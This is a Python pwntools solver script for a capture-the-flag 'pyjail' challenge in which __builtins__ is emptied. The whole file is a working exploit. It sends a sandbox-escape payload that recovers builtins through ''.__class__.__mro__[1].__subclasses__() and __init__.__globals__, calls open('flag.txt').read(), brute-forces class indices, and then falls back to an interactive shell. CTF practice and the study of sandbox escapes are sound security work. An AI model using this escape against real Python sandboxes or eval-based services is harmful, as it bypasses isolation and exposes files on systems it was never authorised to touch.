#!/usr/bin/env python3
"""
Solver for 'another penjara' advanced pyjail challenge.

Challenge: __builtins__ is completely empty.
Solution: Use class introspection to recover builtins via:
  ''.__class__.__mro__[1].__subclasses__()[X].__init__.__globals__['__builtins__']

We try common indices until we find one that works.
"""

from pwn import *

HOST = args.HOST or "localhost"
PORT = int(args.PORT or 9998)

def main():
    io = remote(HOST, PORT)
    
    # Wait for prompt
    io.recvuntil(b">>> ")
    
    log.info("Trying different class indices to recover builtins...")
    
    # Common indices where classes have __builtins__ in their __init__.__globals__
    # These vary by Python version, so we try multiple
    indices_to_try = [103, 104, 105, 102, 101, 100, 99, 98, 106, 107, 108, 109, 110, 
                      80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95]
    
    for idx in indices_to_try:
        # Try to read flag directly with this index
        exploit = f"''.__class__.__mro__[1].__subclasses__()[{idx}].__init__.__globals__['__builtins__']['open']('flag.txt').read()".encode()
        io.sendline(exploit)
        
        try:
            response = io.recvuntil(b">>> ", timeout=2)
            response_str = response.decode()
            
            if "SnapanCTF{" in response_str:
                # Extract flag
                import re
                match = re.search(r"SnapanCTF\{[^}]+\}", response_str)
                if match:
                    log.success(f"Found working index {idx}")
                    log.success(f"FLAG: {match.group(0)}")
                    io.close()
                    return
            elif "Error" not in response_str:
                log.info(f"Index {idx}: {response_str[:50]}...")
        except:
            pass
    
    log.warning("Could not find flag, entering interactive mode...")
    io.interactive()

if __name__ == "__main__":
    main()
